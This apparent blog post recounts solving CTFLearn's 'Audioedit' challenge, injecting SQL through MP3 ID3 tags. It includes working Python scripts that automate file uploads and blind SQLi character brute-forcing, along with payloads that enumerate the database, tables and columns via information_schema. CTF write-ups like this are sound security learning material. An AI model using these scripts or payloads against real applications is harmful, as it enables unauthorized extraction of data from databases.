---
layout: post
title:  "CTFLearn's Audioedit Writeup"
date:   2020-09-18 16:25:10 +0545
author: machinexa
image: /posts/writeups/assets/images/ctflearn_audioedit_homepage.png
category: Writeups
---
<br>
## Description
The CTF was about exploit a terribly insane blind SQLi. I started in the morning,  lost my entire day on simple mistakes, and got really frustrated when doing the challenge. The URL was [https://web.ctflearn.com/audioedit/](https://web.ctflearn.com/audioedit/). I received this challenge at night from my friend Jokr.

### Finding the Injection
As its name suggests, it takes `.mp3` file and edits it. So, we have a file upload which leads to an edit page with a unique generated filename. I tried playing with file upload. Eventually, it leads me to nowhere and I assumed file upload was secure. So, what to do then. Well, it took me some time to realize the file was being fetched from the database. The parameter looked like this: [?file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3](https://web.ctflearn.com/audioedit/edit.php?file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3)  

Though jokr said SQLi isn't here still I tried SQL injection and injecting a quote, I got error **" Error fetching audio from DB"** which confirmed the vulnerability.

![Error String](/posts/writeups/assets/images/ctflearn_audioedit_errorpage.png)

Trying SQLi for some time again failed me. It wasn't working for some reason (not because of rabbit). Later, injecting " gave me the same error as '  which means it's not vulnerable. I took some caffeine and started thinking where could I find a possible attack vector as I could only upload .mp3. 

Later he gave a hint that SQLi is in Exif metadata. Also, `exiftool` didn't work for the mp3 file, so I had to find something different. The module `python3-mutagen` is a module for adding tags in mp3 which provided `mid3v2` a perfect cmd line script for the situation.

### Knowing the Injection
First, I found the vulnerability by adding ' and " and then confirmed it. `mid3v2 -a "' or '" testing.mp3` is an example of how to inject SQL payload to music tags. I got 0 in author response which indicates condition evaluated to False. Since, running the program, uploading it, and checking the condition is lengthy, I used `Burpsuite` which was my second mistake. Mine frustration slowly increased with time, later I found out it was because I directly edited the request from burp suite and editing a binary is never good idea, prone to mistakes *(which I should never have).*

![Burp Request](/posts/writeups/assets/images/ctflearn_audioedit_burprequest.png)

I tried sending some advanced payloads like `' or 1=1 or '` and `' and 1=1 and '` to see how it behaves. Unfortunately, it was throwing error. Each time I tried something new, it gave an error. One more thing to notice is that sending file content with the same content but entirely different filename caused **File Exist** error to be thrown. 

I tried to make a python3 script to upload the file and directly give me response which cost me around 1-2 hour. Finally, I have a script that does automatically does everything, I just have to type the payload. Here's a small portion: 
```python
url = "https://web.ctflearn.com/audioedit/submit_upload.php"
while True:
    s = requests.Session()
    multipart_data = MultipartEncoder(
        fields = {
            'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
        })
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': multipart_data.content_type
        } 
    def setcmd():
        command = 'mid3v2 -a "' + get_random_string(4) + input("Enter SQLi payload: ") + '" testing.mp3'
        print(command)
        system(command)
    setcmd()
    response = s.post(url, data=multipart_data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    for small in soup.find_all('small'):
        print(small)
``` 
<br>
Finally, I found out what I was exploiting was boolean-based blind SQLi. For further confirmation, I did this which I thought would evaluate to true and it did evaluate to true `' and 2=2 or 1=1 or '`

### Exploiting SQLi Blindly 1
The insanity starts here. I DM'ed **Blindhero**, another of my nice mentor/friend for some tips on how to get DBMS, tables... He told me to use `SELECT CASE WHEN` which works on Sqlite3. Unfortunately, it didn't work as it was MySQL. He also said about how to get a database, table, and so on. He constantly helped me debug my payload. Now, I started by very basic information gathering payload `' and 2=2 or (SELECT substr(version(),1,1)=5) or '`  which returned 1 and is equivalent to boolean true. 

Then, moving forward to finding the current database which was not easy but ok. Since it was boolean-based blind doing it by hand would take ages. So, I coded some exploit. Crafting query took time but eventually this `' and 2=2 or (SELECT substr(database(),1,1)='a')` returned true. Here's some of my code with an explanation.
```python
allchar = 'abcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
E = SQLExploit()
while True:
    for i in allchar:
        s = requests.Session()
        E.reset()
        time.sleep(0.2)
        if E.exploitdb(i) == True:
            print("Breaked loop")
            break
        else:
            continue
``` 
<br>
E is an SQLExploit object which I will talk later and tries all the character while the `reset()` function opens the mp3 file again. I ran into a problem where the first query ran successfully while the second error out in a while loop. This again wasted my 10 minutes along with giving me some irritation. Later I fixed it by reopening the file each time I execute the loop. The SQLExploit class looks like this: 
```python
class SQLExploit:
    def __init__(self):
        self.md = ""
        self.hd = ""
        self.text = ""
        self.pos = 1

    def reset(self):
        self.md = MultipartEncoder(
            fields = {
                'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
            }
        )
        self.hd = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': self.md.content_type
        }
    def setcmd(self, character):
        #Finds database
        try:
            command = 'mid3v2 -a "' + get_random_string(5) +   "' and 2=2 or (select substr(database()," + str(self.pos) + ",1)='" + character +"') or '" + '" testing.mp3'
            print(command)
            system(command)
        except Exception as E:
            print(E)
```
<br>
`self.md` and `self.hd` are multipart data and headers respectively. `reset()` opens the mp3 file while `get_random_string(5)` gets random string of length 5 as it name says. `system()` is short of `os.system()` and position is `self.pos` is position of substr. Since, we got 1st postion as 'a', we need to increment it. `self.text` is for storing name of database found.

So, having everything we need let's start the exploit. Also, some part was slightly modified in this code which I won't show as it's not necessary.
Now, let's run the exploit. 

![Database Audioedit](/posts/writeups/assets/images/ctflearn_audioedit_database.png)

<br>
### Exploiting SQLi Blindly 2
Looks nice right? Let's go for a table. I asked him about how to find tables and hinted about information_schema. I created a similar database and table in localhost and came up with this:  
 `(SELECT table_schema, table_name FROM information_schema.tables where table_schema = 'audioedit' and table_name LIKE 'a%' limit 1;)`

Unfortunately, it's hard to include this upper payload in SQLi, and that's why I did the `substr()` method. Also, after debugging my payload and improving it I get:     

`' and 2=2 or (SELECT substr(table_name,1,1) FROM information_schema.tables where table_schema = 'audioedit' limit 1)='h' or '`   
 
I also modified the `setcmd()` function slightly and exploiting gives me audioedit which is the same as the database name. Ah, I was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema I used this:   

`' and 2=2 or (SELECT substr(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
<br>
So, after running script I know number of columns are 5, now what? After writing another payload to find column it errored out no matter what I used. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
```sql
' and 2=2 or (SELECT substr(column_name,1,1) FROM information_schema.columns where table_name='audioedit' limit 1 OFFSET 1)='a' or '
' and 2=2 or (SELECT((SELECT count(*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
' and 2=2 or (select substr(column_name,1,1)='y' from information_schema.columns where table_name = 'audioedit' limit 1,1) or '
```
<br>
First, I thought limit was blocked as every payload used it. Trying simpler payloads like `' and 2=2 or (select version() like '5%' limit 1) or '` did work. I got to a point when the payload was large, then for debuggin I added ()  which caused the error. Oh, so I figured out spaces are the problem. Why did I use 2=2 in the first place.. Also, I reduced `get_random_string()` to length of 2. Finally, it worked like a charm and got the first column name, then second, then third... 

![Random Column name](/posts/writeups/assets/images/ctflearn_audioedit_random.png)

I did some SQL magic in some columns. There were multiple columns and the one that caught my attention was file column. The column had a row with value `supersecretflagf1le.mp3` which hints the flag. So, I used the file parameter to reference that file, and unfortunately, I didn't get a flag. I was still stuck and frustated to point where I felt very sick. 

### Audio Editing
Its the final step, setting visualization to a sonogram and editing some other kind of stuff it was printing lof of stuff. I was thinking where could be the flag hidden in that file. After changing each options and trying all combinatins I finally got the flag embedded in the image. Then I submitted it and the feeling of exploiting was awesome.

![Random Column name](/posts/writeups/assets/images/ctflearn_audioedit_flag.png)

I used this resource constantly during exploiting SQLi: [SQL Wiki](https://sqlwiki.netspi.com/)


### Takeaway 

* Always check for the length of SQL query you can inject.
* Pay attention to smaller details to prevent error.
* Never edit a binary by hand in Burpsuite. It's prone to errors.


